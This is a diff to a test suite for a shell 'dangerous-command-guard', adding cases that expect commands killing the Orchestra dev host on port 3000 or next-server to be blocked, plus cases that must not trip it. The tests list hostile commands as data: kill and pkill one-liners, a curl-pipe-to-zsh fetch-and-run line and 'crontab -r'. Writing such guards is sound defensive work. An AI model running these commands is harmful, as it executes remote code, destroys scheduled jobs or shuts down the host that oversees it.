@@ -71,6 +71,13 @@ describe("dangerous-command-guard / shell", () => {
       ["curl -sSL get.example.com | zsh", "curl | zsh", "shell.pipe-to-shell"],
       // --- crontab -r ---
       ["crontab -r", "crontab -r", "shell.crontab-r"],
+      // --- Orchestra dev-host self-termination (:3000 / next-server) ---
+      ["lsof -ti:3000 | xargs kill -9", "lsof -ti:3000 (combined flag) | kill", "shell.kill.orchestra-host"],
+      ["kill $(lsof -ti tcp:3000)", "kill $(lsof tcp:3000)", "shell.kill.orchestra-host"],
+      ["fuser -k 3000/tcp", "fuser -k 3000/tcp", "shell.kill.orchestra-host"],
+      ["npx kill-port 3000", "npx kill-port 3000", "shell.kill.orchestra-host"],
+      ["pkill -f next-server", "pkill -f next-server", "shell.kill.orchestra-host"],
+      ['pkill -f "next dev"', "pkill -f 'next dev'", "shell.kill.orchestra-host"],
     ];
 
     for (const [code, desc, expectedRule] of cases) {
@@ -120,6 +127,10 @@ describe("dangerous-command-guard / shell", () => {
       // legitimate cat
       ["cat ./config.json", "cat local file"],
       ["cat package.json", "cat package.json"],
+      // dev-host guard is scoped to :3000 / next — these must NOT trip it
+      ["killall node", "killall node (not scoped to next)"],
+      ["curl http://localhost:3000/api/health", "curl localhost:3000"],
+      ["lsof -i :8080", "lsof on a different port"],
     ];
 
     for (const [code, desc] of cases) {
